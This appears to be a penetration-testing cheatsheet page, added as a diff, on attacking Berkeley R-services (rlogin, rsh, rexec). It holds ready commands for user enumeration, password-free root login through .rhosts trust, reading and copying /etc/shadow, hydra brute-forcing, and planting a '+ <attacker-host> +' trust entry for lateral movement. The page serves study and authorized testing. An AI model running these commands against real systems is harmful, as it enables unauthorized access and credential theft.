@@ -1,0 +1,297 @@
+<!doctype html>
+<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1">
+<title>R-services · ArxOS cheatsheets</title><link rel="stylesheet" href="../../../../codex.css"></head>
+<body><header class="cx-top"><a class="cx-brand" href="../../../../index.html">ArxOS</a><span class="cx-sub">Cheatsheets</span>
+<a class="cx-search-link" href="../../../../index.html#search">Search</a></header>
+<main class="cx-main"><nav class="cx-crumbs"><a href="../../../../index.html">Cheatsheets</a> › Network › Service Footprinting</nav><h1>R-services</h1><p class="cx-lede">Berkeley R-services (rlogin/rsh/rexec) on ports 512/513/514 - host-based trust enumeration via .rhosts and hosts.equiv, exploiting trusted-host relationships, and the rwho/rusers information disclosure.</p><div class="cx-tags"><span class="cx-tag">MITRE T1046, T1199, T1018, T1078</span><span class="cx-tag">D3FEND D3-NTA</span><span class="cx-tag">IMPACT InternalAccess, CredentialTheft</span></div><article class="cx-body"><h2 id="tldr">TL;DR</h2>
+<p>The Berkeley R-services - <code>rlogin</code>, <code>rsh</code>, <code>rexec</code>, and the auxiliary <code>rwho</code>/<code>rusers</code> - are pre-SSH remote-access protocols designed for trusted Unix networks in the 1980s. They authenticate by <em>source host</em>, not by user - if the server trusts <code>clienthost.example.com</code>, anyone connecting from <code>clienthost</code> claiming to be user <code>alice</code> is granted access as <code>alice</code>. Plaintext. No encryption. No real authentication. <strong>Anywhere you find these running, it's either a relic or a finding.</strong></p>
+<figure class="cx-code"><figcaption></figcaption><pre><code># 1. Service scan - the trio of R-services
+nmap -sV -p512,513,514 &lt;target&gt;
+
+# 2. Information disclosure: who&#x27;s logged in
+rusers -al &lt;target&gt;     # remote users + idle time
+rwho                    # similar, broadcasts to local subnet
+
+# 3. Try direct login (rlogin)
+rlogin -l root &lt;target&gt;
+
+# 4. Run a command (rsh)
+rsh -l root &lt;target&gt; id
+
+# 5. With explicit password (rexec)
+rexec -l root &lt;target&gt; id</code></pre></figure>
+<p>Success indicator: any login succeeds without password (host-trust misconfiguration), or <code>rusers</code> returns a list of currently-logged-in users.</p>
+<h2 id="protocol-overview">Protocol overview</h2>
+<table>
+<thead>
+<tr>
+<th>Service</th>
+<th>Port</th>
+<th>Protocol detail</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong><code>rexec</code></strong></td>
+<td>TCP 512</td>
+<td>Run one command on the remote host. Sends username + password + command in plaintext.</td>
+</tr>
+<tr>
+<td><strong><code>rlogin</code></strong></td>
+<td>TCP 513</td>
+<td>Interactive login shell. If trust is configured, no password prompt.</td>
+</tr>
+<tr>
+<td><strong><code>rsh</code></strong></td>
+<td>TCP 514</td>
+<td>Run one command. If trust is configured, no password prompt.</td>
+</tr>
+<tr>
+<td><strong><code>rwho</code></strong></td>
+<td>UDP 513</td>
+<td>Broadcasts which users are logged in on the local network.</td>
+</tr>
+<tr>
+<td><strong><code>rusers</code></strong></td>
+<td>RPC (port from portmapper)</td>
+<td>Returns logged-in users from a remote host.</td>
+</tr>
+<tr>
+<td><strong><code>rcp</code></strong></td>
+<td>Uses <code>rsh</code> (TCP 514)</td>
+<td>Remote file copy.</td>
+</tr>
+</tbody>
+</table>
+<p>The protocols themselves are tiny - <code>rlogin</code> is essentially "send the username, optionally a TTY type, optionally a window size; everything else is a transparent character stream." <code>rsh</code> is even simpler - "send the local username, the remote username, and the command to run."</p>
+<h3 id="the-trust-model">The trust model</h3>
+<p>When <code>rlogin</code>/<code>rsh</code> are configured to bypass passwords, the daemon checks two files on the <em>server</em> (target) side:</p>
+<table>
+<thead>
+<tr>
+<th>File</th>
+<th>Scope</th>
+<th>Format</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>/etc/hosts.equiv</code></td>
+<td>System-wide</td>
+<td>One line per trusted host. Any user on that host can log in as the <em>same-named</em> user on this host.</td>
+</tr>
+<tr>
+<td><code>~/.rhosts</code></td>
+<td>Per-user</td>
+<td>One line per trusted (hostname, username) pair. Anyone on that host as that user can log in as the owner of the <code>.rhosts</code>.</td>
+</tr>
+</tbody>
+</table>
+<p>Example <code>/etc/hosts.equiv</code>:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>client1.example.com
+client2.example.com</code></pre></figure>
+<p>Means: any non-root user on <code>client1.example.com</code> can <code>rlogin</code> to this host as the same-named user without a password. (Note: <code>hosts.equiv</code> does not grant root access; root requires <code>/.rhosts</code>.)</p>
+<p>Example <code>~alice/.rhosts</code>:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>bob-laptop.example.com bob
+client1.example.com    alice
++  +</code></pre></figure>
+<p>Lines 1-2: trust <code>bob</code> on <code>bob-laptop</code> and <code>alice</code> on <code>client1</code>, both able to login as <code>alice</code> here.</p>
+<p>Line 3 (<code>+ +</code>): the security disaster. <strong>Any user on any host</strong> can log in as <code>alice</code> without a password. This pattern was historically a recommended setting in some HP-UX and IBM AIX installation guides, and copy-paste configurations from those guides still exist in the wild.</p>
+<p>A <code>+</code> in the hostname field = any host. A <code>+</code> in the username field = any user. <code>+ +</code> = "trust everything."</p>
+<h3 id="connections-come-from-low-ports">Connections come from low ports</h3>
+<p>R-services check that the <em>source port</em> is below 1024 (a "trusted port" because non-root users can't bind to it on Unix). This was security in the 1980s - only root on the source host could initiate. It's not security in the 2020s because anyone with root on a single Linux box can craft such packets at will.</p>
+<h2 id="default-configuration">Default configuration</h2>
+<p>Modern Linux distros don't even ship the R-service daemons. You have to install <code>rsh-server</code>, <code>inetutils-inetd</code>, or similar - and then explicitly enable them in inetd/xinetd:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code># /etc/inetd.conf
+shell  stream tcp nowait root  /usr/sbin/tcpd  in.rshd -L
+login  stream tcp nowait root  /usr/sbin/tcpd  in.rlogind
+exec   stream tcp nowait root  /usr/sbin/tcpd  in.rexecd</code></pre></figure>
+<p>When you encounter R-services on a target today, it's almost always one of:</p>
+<ol>
+<li>A legacy Unix system (Solaris, HP-UX, AIX) that has never been modernized</li>
+<li>An embedded device or appliance whose vendor never updated to SSH</li>
+<li>A deliberate honeypot</li>
+</ol>
+<p>In all three cases, the engagement value is high - the protocol's design guarantees credential-free access if trust is configured at all, and credential-grabbing if password auth is used (because it's plaintext).</p>
+<h2 id="dangerous-settings">Dangerous settings</h2>
+<table>
+<thead>
+<tr>
+<th>Setting</th>
+<th>Why it's bad</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>+ +</code> in <code>/etc/hosts.equiv</code></td>
+<td>Any user on any host can log in (except root)</td>
+</tr>
+<tr>
+<td><code>+ +</code> in <code>/.rhosts</code> (root's)</td>
+<td><strong>Anyone can log in as root</strong></td>
+</tr>
+<tr>
+<td><code>+ +</code> in user <code>.rhosts</code></td>
+<td>Anyone can log in as that user</td>
+</tr>
+<tr>
+<td>Wildcard <code>+</code> in hostname field</td>
+<td>"trust this user from anywhere"</td>
+</tr>
+<tr>
+<td>Wildcard <code>+</code> in username field</td>
+<td>"trust any user from this host as me"</td>
+</tr>
+<tr>
+<td><code>.rhosts</code> writable by anyone other than the owner</td>
+<td>An attacker can plant their own trust entry</td>
+</tr>
+<tr>
+<td>R-services exposed to public internet</td>
+<td>Plaintext credentials + non-existent auth = trivial compromise</td>
+</tr>
+<tr>
+<td><code>rusers</code> / <code>rwho</code> exposed externally</td>
+<td>User-enumeration primitive</td>
+</tr>
+</tbody>
+</table>
+<h2 id="footprinting-commands">Footprinting commands</h2>
+<h3 id="service-scan">Service scan</h3>
+<figure class="cx-code"><figcaption>shell</figcaption><pre><code class="language-shell">sudo nmap -sV -p512,513,514 10.0.14.128</code></pre></figure>
+<figure class="cx-code"><figcaption></figcaption><pre><code>PORT    STATE SERVICE EXTERNAL-VERSION
+512/tcp open  exec    netkit-rsh rexecd
+513/tcp open  login   OpenBSD or Solaris rlogind
+514/tcp open  shell   Netkit rshd</code></pre></figure>
+<p>Three open R-service ports = all three daemons running. Each is independently enumerable.</p>
+<h3 id="user-enumeration-via-rusers">User enumeration via rusers</h3>
+<figure class="cx-code"><figcaption>shell</figcaption><pre><code class="language-shell">rusers -al 10.0.14.128</code></pre></figure>
+<figure class="cx-code"><figcaption></figcaption><pre><code>student     10.0.14.128:console     Sep 16 14:11      :01
+admin           10.0.14.128:pts/0       Sep 16 14:35
+backup          10.0.14.128:pts/1       Sep 16 13:21</code></pre></figure>
+<p><code>-a</code> shows all users (default omits idle accounts), <code>-l</code> long format.</p>
+<p><code>rwho</code> is similar but listens for broadcasts instead of actively querying - useful on shared subnets to passively map who's logged in where:</p>
+<figure class="cx-code"><figcaption>shell</figcaption><pre><code class="language-shell">rwho</code></pre></figure>
+<p>Both are user-enumeration primitives without any authentication required. Treat the user list as input to password-spray and to .rhosts hunting.</p>
+<h3 id="rlogin">rlogin</h3>
+<figure class="cx-code"><figcaption>shell</figcaption><pre><code class="language-shell">rlogin -l root 10.0.14.128</code></pre></figure>
+<p>If <code>/.rhosts</code> has <code>+ +</code>:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>Last login: Wed Sep 16 14:11:01 from 10.0.14.10
+root@target:~#</code></pre></figure>
+<p>You're root, no password, no audit trail beyond the connection log.</p>
+<p>If trust isn't configured, you get a password prompt - same plaintext-credential exposure as rexec.</p>
+<p>To try non-root accounts iteratively:</p>
+<figure class="cx-code"><figcaption>shell</figcaption><pre><code class="language-shell">for user in $(cat users.txt); do
+  echo &quot;=== $user ===&quot;
+  rlogin -l &quot;$user&quot; 10.0.14.128 -e ~. 2&gt;&amp;1 | head -3
+done</code></pre></figure>
+<p><code>-e ~.</code> sets the escape sequence to <code>~.</code> (the default) so you can break out of stuck sessions.</p>
+<h3 id="rsh-one-shot-command-execution">rsh - one-shot command execution</h3>
+<figure class="cx-code"><figcaption>shell</figcaption><pre><code class="language-shell">rsh -l root 10.0.14.128 &#x27;id; uname -a; cat /etc/shadow&#x27;</code></pre></figure>
+<figure class="cx-code"><figcaption></figcaption><pre><code>uid=0(root) gid=0(root) groups=0(root)
+Linux target 4.15.0-...
+root:$6$...
+daemon:*:...</code></pre></figure>
+<p><code>rsh</code> runs one command and returns. With trust configured for root, this is <code>xp_cmdshell</code> for Unix - full remote command execution. The output streams back over the same connection.</p>
+<p><code>rcp</code> (built on <code>rsh</code>) copies files:</p>
+<figure class="cx-code"><figcaption>shell</figcaption><pre><code class="language-shell">rcp /etc/passwd root@10.0.14.128:/tmp/stolen-passwd     # copy local to remote
+rcp root@10.0.14.128:/etc/shadow /tmp/                  # copy remote to local</code></pre></figure>
+<h3 id="rexec-credentialed-command-execution">rexec - credentialed command execution</h3>
+<figure class="cx-code"><figcaption>shell</figcaption><pre><code class="language-shell">rexec -l root 10.0.14.128 id
+Password:        # prompts for password (plaintext on the wire)
+uid=0(root) gid=0(root)</code></pre></figure>
+<p><code>rexec</code> always requires credentials - no .rhosts bypass. But it transmits them in cleartext, so anyone sniffing the network captures them.</p>
+<h3 id="brute-force">Brute-force</h3>
+<figure class="cx-code"><figcaption>shell</figcaption><pre><code class="language-shell">hydra -L users.txt -P passwords.txt rexec://10.0.14.128
+hydra -L users.txt -P passwords.txt rlogin://10.0.14.128
+hydra -L users.txt -P passwords.txt rsh://10.0.14.128</code></pre></figure>
+<p>Hydra has separate modules for each. R-services typically don't implement rate-limiting (the protocols are too old to have had it bolted on), making brute-force feasible.</p>
+<h3 id="detecting-rhosts-from-credentialed-access">Detecting <code>.rhosts</code> from credentialed access</h3>
+<p>When you've gained access by <em>any</em> means (rlogin trust, brute-force, or a different service entirely), check for further trust to abuse:</p>
+<figure class="cx-code"><figcaption>shell</figcaption><pre><code class="language-shell"># All users&#x27; .rhosts files
+cat /etc/hosts.equiv
+find /home -name .rhosts -exec ls -la {} \; -exec cat {} \;
+find /root -name .rhosts -exec ls -la {} \; -exec cat {} \;</code></pre></figure>
+<p>A <code>+</code> in any of these means more lateral movement is available.</p>
+<h3 id="nse-scripts">NSE scripts</h3>
+<figure class="cx-code"><figcaption>shell</figcaption><pre><code class="language-shell">nmap -p512,513,514 --script &quot;rusers&quot; 10.0.14.128
+nmap -p512,513,514 --script &quot;rexec-brute&quot; --script-args userdb=u,passdb=p 10.0.14.128
+nmap -p512,513,514 --script &quot;rlogin-brute&quot; --script-args userdb=u,passdb=p 10.0.14.128</code></pre></figure>
+<h2 id="common-chained-workflows">Common chained workflows</h2>
+<p><strong>rusers user list → rlogin trust check:</strong>
+1. <code>rusers -al target</code> returns user list
+2. For each user, try <code>rlogin -l &lt;user&gt; target</code>
+3. Trust-bypass logins succeed silently - credentials never prompted</p>
+<p><strong>Sniff rexec creds → reuse on SSH:</strong>
+1. Any rexec session sends username+password in plaintext
+2. Intercepting that traffic (ARP spoof on the local subnet, mirror port, or just being any router on the path) yields credentials
+3. Same credentials work on SSH, FTP, mail - same human, same password</p>
+<p><strong><code>.rhosts</code> write → trust insertion:</strong>
+1. NFS export (see <a href="../nfs/index.html">NFS</a>) or rsync writable share contains <code>~user/.rhosts</code> writable
+2. Write <code>+ &lt;attacker-host&gt; +</code> into it
+3. From your attack host, <code>rlogin -l &lt;user&gt; target</code> - no password needed</p>
+<p><strong>Internal subnet rwho passive mapping:</strong>
+1. Listen for rwho broadcasts on the local subnet (UDP 513, broadcast)
+2. Build a map of "which users are logged in to which hosts right now"
+3. Use that map to time engagements - attack hosts when admin users aren't logged in to reduce detection risk</p>
+<h2 id="quick-reference">Quick reference</h2>
+<table>
+<thead>
+<tr>
+<th>Task</th>
+<th>Command</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Service scan</td>
+<td><code>nmap -sV -p512,513,514 &lt;target&gt;</code></td>
+</tr>
+<tr>
+<td>User enumeration</td>
+<td><code>rusers -al &lt;target&gt;</code></td>
+</tr>
+<tr>
+<td>Subnet passive map</td>
+<td><code>rwho</code> (listens for broadcasts)</td>
+</tr>
+<tr>
+<td>rlogin (try trust)</td>
+<td><code>rlogin -l &lt;user&gt; &lt;target&gt;</code></td>
+</tr>
+<tr>
+<td>rsh one-shot command</td>
+<td><code>rsh -l &lt;user&gt; &lt;target&gt; '&lt;cmd&gt;'</code></td>
+</tr>
+<tr>
+<td>rexec with password</td>
+<td><code>rexec -l &lt;user&gt; &lt;target&gt; '&lt;cmd&gt;'</code> (prompts for pw)</td>
+</tr>
+<tr>
+<td>rcp upload</td>
+<td><code>rcp &lt;local&gt; &lt;user&gt;@&lt;target&gt;:&lt;remote&gt;</code></td>
+</tr>
+<tr>
+<td>rcp download</td>
+<td><code>rcp &lt;user&gt;@&lt;target&gt;:&lt;remote&gt; &lt;local&gt;</code></td>
+</tr>
+<tr>
+<td>Brute force rexec</td>
+<td><code>hydra -L u -P p rexec://&lt;target&gt;</code></td>
+</tr>
+<tr>
+<td>Brute force rlogin</td>
+<td><code>hydra -L u -P p rlogin://&lt;target&gt;</code></td>
+</tr>
+<tr>
+<td>Find trust files (post-access)</td>
+<td><code>find / -name .rhosts -ls 2&gt;/dev/null</code></td>
+</tr>
+<tr>
+<td>Read hosts.equiv</td>
+<td><code>cat /etc/hosts.equiv</code></td>
+</tr>
+</tbody>
+</table></article><nav class="cx-pager"><a class="cx-prev" href="../rsync/index.html">Previous: Rsync</a><a class="cx-next" href="../rdp/index.html">Next: RDP</a></nav></main>
+<footer class="cx-foot"><p>For authorized testing and study only. <a href="../../../../license.html">License</a></p></footer>
+<script src="../../../../codex.js"></script></body></html>
